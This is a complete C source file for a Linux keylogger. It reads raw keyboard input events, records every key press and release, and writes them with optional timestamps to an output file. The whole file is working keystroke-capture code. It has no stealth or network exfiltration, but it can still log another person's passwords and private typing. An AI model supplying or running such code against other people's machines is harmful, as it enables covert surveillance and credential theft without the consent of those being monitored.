/**
 * @file keylog.c
 *
 * @brief Implementation of a keylogger to capture keystrokes and write
 *        them to a file
 */

#define _POSIX_C_SOURCE 200809L /* sigaction */


/* System includes */
#include <errno.h>          /* EINTR */
#include <linux/input.h>    /* EV_KEY, input_event structures */
#include <signal.h>         /* sigaction, SIGINT, SIG_IGN, sigemptyset */
#include <stdbool.h>        /* bool, true, false */
#include <stddef.h>         /* size_t, ssize_t */
#include <stdio.h>          /* perror */
#include <stdlib.h>         /* exit */
#include <string.h>         /* strlen */
#include <time.h>           /* time_t, tm_info, strftime */
#include <unistd.h>         /* write, read, close */

/* Project includes */
#include <keycodes.h>

/* Local includes */
#include <keylog.h>


/* Local definitions */
/* 'SA_RESTART' is not defined with this '_POSIX_C_SOURCE' */
#ifndef SA_RESTART
#define SA_RESTART (0x10000000) /**< 'SA_RESTART' causes interrupted
                                     system calls to automatically
                                     restart instead of failing with
                                     'EINTR' */
#endif  /* ! SA_RESTART */
#define BUFFER_SIZE (100)       /**< Buffer size for reading input
                                     events */


/* Static variables */
static volatile bool loop = true;   /**< Boolean flag controlling the
                                         main loop execution, set to
                                         @c false on @c SIGINT */

/**
 * @brief Signal handler for @c SIGINT to stop the main loop
 *
 * @param sig Signal number (@c SIGINT)
 */
static void sigint_handler(int sig)
{
    keylogger_stop();
}


/**
 * @brief Get the current date and time and stores it in the buffer
 *
 * @param buf    Buffer where the formatted timestap will be stored
 * @param buf_sz Size of the buffer
 */
static void get_current_time(char *buf, size_t buf_sz)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    struct tm *tm_info = localtime(&ts.tv_sec);
    char tz[6];         /* timezone buffer: ±HHMM */

    strftime(buf, buf_sz, "%Y-%m-%d %H:%M:%S", tm_info);
    snprintf(buf + strlen(buf), buf_sz - strlen(buf),
            ".%03ld", ts.tv_nsec / 1000000);
    strftime(tz, sizeof(tz), "%z", tm_info);
    snprintf(buf + strlen(buf), buf_sz - strlen(buf), " %s", tz);
}


/**
 * @brief Ensure that the string pointed to by @p str is written to the
 *        file with file descriptor @p fd
 *
 * @param fd  File descriptor to write to
 * @param str String to write
 *
 * @return Status of the operation
 * @retval  true if writing completes successfully
 * @retval  false otherwise
 */
static bool write_all(int fd, const char *str)
{
    size_t len = strlen(str);
    size_t total_written = 0;

    while (total_written < len) {
        ssize_t written = write(fd,
                str + total_written, len - total_written);
        if (written <= 0) {
            return false;
        }
        total_written += (size_t) written;
    }

    return true;
}


/**
 * @brief Write data safely to the file, ignoring @c SIGPIPE signals
 *
 * Wrapper around @a write_all which exits safely if the write fails,
 * without the @c SIGPIPE terminating the program abruptly.
 *
 * @param fd        File descriptor to write to
 * @param str       String to write
 * @param kbd       Keyboard file descriptor
 * @param timestamp Whether to prepend the timestamp to the keystroke
 */
static void safe_write_all(int fd, const char *str, int kbd,
        bool add_timestamp)
{
    static struct sigaction old_action;
    struct sigaction new_action = { .sa_handler = SIG_IGN };

    sigemptyset(&new_action.sa_mask);
    sigaction(SIGPIPE, &new_action, &old_action);

    /* Add timestamp */
    if (add_timestamp) {
        char timestamp[32];
        get_current_time(timestamp, sizeof(timestamp));

        if (!write_all(fd, timestamp)) {
            close(fd);
            perror("write timestamp");
            exit(EXIT_FAILURE);
        }

        if (!write_all(fd, "  ")) {
            close(fd);
            perror("write space after timestamp");
            exit(EXIT_FAILURE);
        }
    }

    /* Write the string, i.e., the keystroke */
    if (!write_all(fd, str)) {
        close(fd);
        perror("write");
        exit(EXIT_FAILURE);
    }

    /* Write new line */
    if (!write_all(fd, "\n")) {
        close(fd);
        perror("write newline");
        exit(EXIT_FAILURE);
    }

    sigaction(SIGPIPE, &old_action, NULL);
}


/* Capture keystrokes and write to file */
void keylogger_start(int kbd, int output_fd, bool add_timestamp)
{
    size_t event_sz = sizeof(struct input_event);
    ssize_t bytes_read = 0;
    struct input_event events[NUM_EVENTS];
    struct sigaction sa;
    bool key_states[NUM_KEYCODES] = {false};

    /* Configure 'SIGINT' signal to call 'sigint_handler' and
     * automatically restart interrupted system calls */
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGINT, &sa, NULL);

    /* Event loop */
    while (loop) {
        bytes_read = read(kbd, events, event_sz * NUM_EVENTS);
        if (bytes_read < 0) {
            if (errno == EINTR) {
                /* Call was intrrupted by the signal */
                continue;
            } else {
                /* Another error to handle */
                break;
            }
        }

        for (size_t i = 0; i < (size_t) bytes_read / event_sz; ++i) {
            if (events[i].type == EV_KEY) {
                bool current_state = (events[i].value == 1);
                bool previous_state = key_states[events[i].code];

                /* Ignore autorepeat events */
                if (events[i].value == 2) {
                    continue;
                }

                /* Only register if state changes */
                if (current_state != previous_state) {
                    char buf[64];
                    const char* action =
                        (current_state) ? "pressed" : "released";

#ifdef DEBUG
                    snprintf(buf, sizeof(buf),
                            "%s (0x%02x; %3d) - %s",
                            kl_keycodes[events[i].code],
                            events[i].code, events[i].code, action);
#else
                    snprintf(buf, sizeof(buf), "%s - %s",
                            kl_keycodes[events[i].code], action);
#endif /* ! DEBUG */

                    safe_write_all(output_fd, buf, kbd, add_timestamp);

                    /* Update key state */
                    key_states[events[i].code] = current_state;
                }
            } /* ! if (events[i].type) */
        } /* ! for (i) */
    } /* ! while (loop) */
}


/* Stop the keylogger by exiting the loop */
void keylogger_stop(void)
{
    loop = false;
}
